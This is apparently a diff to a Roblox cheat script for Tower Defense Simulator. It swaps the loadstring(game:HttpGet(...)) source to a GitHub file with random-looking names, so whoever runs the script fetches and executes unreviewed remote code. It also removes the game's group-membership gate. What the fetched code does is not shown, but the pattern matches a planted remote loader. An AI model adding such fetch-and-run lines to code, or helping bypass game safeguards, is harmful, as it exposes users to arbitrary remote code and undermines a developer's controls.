@@ -23,7 +23,7 @@ if not getgenv().ExecutedAlr then
     getgenv().MapUsed = false
     loadstring(
         game:HttpGet(
-            "https://raw.githubusercontent.com/BxB-HUB/BxB-Hub-PremiumScript/main/BxB-Script/Tower-Defense-Simulator/AutoFarm/Low-LvL.lua/Notify.lua"
+            "https://raw.githubusercontent.com/banbuskox/dfhtyxvzexrxgfdzgzfdvfdz/main/sjkdkjlfdjnnmklcvxjNotifCr"
         )
     )()
     if isfile("DNR.txt") and not isfolder("TDS_AutoStrat") then
@@ -1393,9 +1393,9 @@ if not getgenv().ExecutedAlr then
             end
         end
     end
---[[    spawn(
+    spawn(
         function()
-            if not game.Players.LocalPlayer:IsInGroup(4914494) then
+      --[[      if not game.Players.LocalPlayer:IsInGroup(4914494) then
                 setclipboard("https://www.roblox.com/groups/4914494/Paradoxum-Games")
                 game.Players.LocalPlayer:Kick(
                     "\n\n---------- AUTO STRAT ----------\n\nError 5:\nYou need to joing Paradoxum Games group in order to use autostrats (link copied to clipboard)\n\n---------- AUTO STRAT ----------\n"
@@ -1403,7 +1403,7 @@ if not getgenv().ExecutedAlr then
                 wait(0.5)
                 while true do
                 end
-            end
+            end]]
             while wait(1) do
                 for h, b in pairs(game.CoreGui:GetDescendants()) do
                     if
@@ -1448,7 +1448,6 @@ if not getgenv().ExecutedAlr then
                 end
             end
         end
-    )]]
-  
+    )
 end
 return a
